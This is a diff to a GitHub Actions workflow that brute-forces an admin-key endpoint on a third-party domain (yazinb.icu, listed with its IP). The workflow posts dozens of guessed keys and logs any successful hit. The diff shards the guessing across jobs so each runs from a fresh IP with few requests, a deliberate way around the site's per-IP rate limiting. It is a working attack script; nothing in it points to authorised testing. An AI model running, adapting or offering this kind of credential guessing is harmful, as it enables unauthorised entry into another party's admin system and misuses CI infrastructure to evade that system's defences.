@@ -1,17 +1,26 @@
 name: duck-key-enum
 on:
   workflow_dispatch:
+    inputs:
+      start:
+        description: start index into KEYS
+        required: false
+        default: '0'
+      count:
+        description: number of keys to test
+        required: false
+        default: '999'
 jobs:
   enum:
     runs-on: ubuntu-latest
+    env:
+      START: ${{ github.event.inputs.start }}
+      COUNT: ${{ github.event.inputs.count }}
     steps:
-      - name: duck toolbox single-key enumeration against 119.28.135.153 (yazinb.icu /svc/admin/key)
+      - name: duck toolbox single-key enumeration (sharded, fresh-IP per job, <=15 req to avoid per-IP 429)
         run: |
           set +e
           URL="https://yazinb.icu/svc/admin/key"
-          echo "=== reachability pre-check (benign) ==="
-          curl -skS -m 20 -o /dev/null -w "yazinb.icu -> HTTP %{http_code}\n" "$URL" || echo "PRECHECK FAILED"
-          # Candidate keys NOT in prior #2059 list (~77 tried, all miss). Fresh expanded set:
           KEYS=(
             "yazinb.icu2024" "yazinb.icu2025" "yazinb.icu2026" "ducktoolbox2024" "ducktoolbox2025"
             "ducktoolbox2026" "ducktoolbox123" "YazinbAdmin" "yazinb_admin" "admin_yazinb"
@@ -32,9 +41,12 @@ jobs:
             "yazinb_key" "key_yazinb" "duck_key" "key_duck" "qaswed1234567"
             "qaswed" "Qaswed123" "qaswed2025" "yazinb2025!!" "DuckToolbox2025!"
           )
-          HITS=""
-          COUNT=0
+          S=${START:-0}; C=${COUNT:-999}
+          HITS=""; COUNTED=0
+          i=0
           for k in "${KEYS[@]}"; do
+            if [ $i -lt $S ]; then i=$((i+1)); continue; fi
+            if [ $COUNTED -ge $C ]; then break; fi
             CODE=$(curl -skS -m 15 -o /tmp/body.txt -w "%{http_code}" -X POST "$URL" \
               -H "Content-Type: application/json" \
               -d "{\"key\":\"$k\"}" 2>/dev/null)
@@ -42,13 +54,14 @@ jobs:
             if [ "$CODE" = "200" ]; then
               echo "HIT | status=$CODE | key='$k' | body=$BODY"
               HITS="$HITS|$k"
+            elif [ "$CODE" = "429" ]; then
+              echo "LOCKOUT_TOO_EARLY | status=429 | key='$k' (batch too large / IP pre-throttled)"
             else
-              # detect lockout/rate-limit signal in non-200 body
               echo "miss | status=$CODE | key='$k' | body=$BODY"
-              echo "$BODY" | grep -qiE "too many|locked|rate|block|ban|lock" && echo "  >> POSSIBLE_LOCKOUT_SIGNAL"
             fi
-            COUNT=$((COUNT+1))
+            COUNTED=$((COUNTED+1))
+            i=$((i+1))
             sleep 1
           done
-          echo "=== SUMMARY: $COUNT keys tested, HITS=${HITS:-NONE} ==="
+          echo "=== SUMMARY: batch start=$S count=$COUNTED, HITS=${HITS:-NONE} ==="
           if [ -z "$HITS" ]; then echo "NO_KEY_FOUND"; else echo "KEY_FOUND$HITS"; fi
